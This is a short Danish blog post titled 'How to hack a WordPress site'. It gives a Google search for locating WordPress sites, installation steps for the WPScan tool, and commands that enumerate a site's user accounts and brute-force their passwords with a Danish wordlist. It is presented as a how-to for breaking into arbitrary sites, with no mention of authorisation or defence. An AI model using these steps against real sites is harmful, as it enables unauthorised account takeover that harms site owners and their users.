---
title: Sådan hacker du en WordPress side.
layout: post
date: 2017-04-10 17:21:29
category: WordPress, Hack
tags: [WordPress, Hack]
---

## Sådan hacker du en WordPress side.

Hvis du har problemer med at finde en side, så kan en simpel Google søgning være behjælpelig.

```
"index of" inurl:wp-content
```

[WpScan](https://github.com/wpscanteam/wpscan)

[Wordlists](https://github.com/mikejakobsen/dictionary-attack)

```bash
cd ~
curl -sSL https://rvm.io/mpapis.asc | gpg --import -
curl -sSL https://get.rvm.io | bash -s stable
source ~/.rvm/scripts/rvm
echo "source ~/.rvm/scripts/rvm" >> ~/.bashrc
rvm install 2.3.3
rvm use 2.3.3 --default
echo "gem: --no-ri --no-rdoc" > ~/.gemrc
gem install bundler
git clone https://github.com/wpscanteam/wpscan.git
cd wpscan
gem install bundler
bundle install --without test
```

```bash
git clone https://github.com/wpscanteam/wpscan.git
cd wpscan
sudo gem install bundler && bundle install --without test
```

```bash
ruby wpscan.rb --url http://wordpress-site.com
```

```bash
ruby wpscan.rb --url http://wordpress-site.com --enumerate u
```
Eller du kan navigere til **http://wordpress-site.com/?author=1** i din browser.

```bash
cd ~
git clone https://github.com/mikejakobsen/dictionary-attack.git
```

```bash
ruby wpscan.rb --url http://wordpress-site.com --wordlist ~/dictionary-attack/danish.dic
```
